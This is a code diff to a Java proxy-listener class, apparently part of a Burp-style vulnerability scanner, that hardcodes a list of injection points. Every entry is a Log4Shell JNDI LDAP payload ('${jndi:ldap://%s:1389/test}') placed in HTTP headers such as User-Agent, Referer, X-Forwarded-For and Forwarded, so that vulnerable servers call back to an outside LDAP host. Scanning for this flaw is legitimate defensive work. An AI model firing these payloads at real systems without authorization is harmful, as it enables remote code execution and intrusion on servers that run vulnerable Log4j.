@@ -243,16 +243,23 @@ class Injector implements IProxyListener {
 
     Injector(Correlator collab) {
         this.collab = collab;
-
-        Scanner s = new Scanner(getClass().getResourceAsStream("/injections"));
-        while (s.hasNextLine()) {
-            String injection = s.nextLine();
-            if (injection.charAt(0) == '#') {
-                continue;
-            }
-            injectionPoints.add(injection.split(",", 3));
+        String[] injections= {"header,Contact,${jndi:ldap://%s:1389/test}",
+                "header,From,${jndi:ldap://%s:1389/test}",
+                "header,User-Agent,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36 ${jndi:ldap://%s:1389/test}",
+                "header,Referer,http://${jndi:ldap://%s:1389/test}/ref",
+                "header,X-Wap-Profile,http://${jndi:ldap://%s:1389/test}/wap.xml",
+                "header,X-Forwarded-For,${jndi:ldap://spoofed.%s:1389/test}",
+                "header,True-Client-IP,${jndi:ldap://spoofed.%s:1389/test}",
+                "header,Client-IP,${jndi:ldap://spoofed.%s:1389/test}",
+                "header,X-Client-IP,${jndi:ldap://spoofed.%s:1389/test}",
+                "header,X-Real-IP,${jndi:ldap://spoofed.%s:1389/test}",
+                "header,X-Originating-IP,${jndi:ldap://spoofed.%s:1389/test}",
+                "header,CF-Connecting_IP,${jndi:ldap://spoofed.%s:1389/test}",
+                "header,Forwarded,for=${jndi:ldap://spoofed.%s:1389/test};by=${jndi:ldap://spoofed.%s:1389/test};host=${jndi:ldap://spoofed.%s:1389/test}"};
+        for(String injection: injections) {
+        	injectionPoints.add(injection.split(",", 3));
         }
-        s.close();
+        
 
     }
 
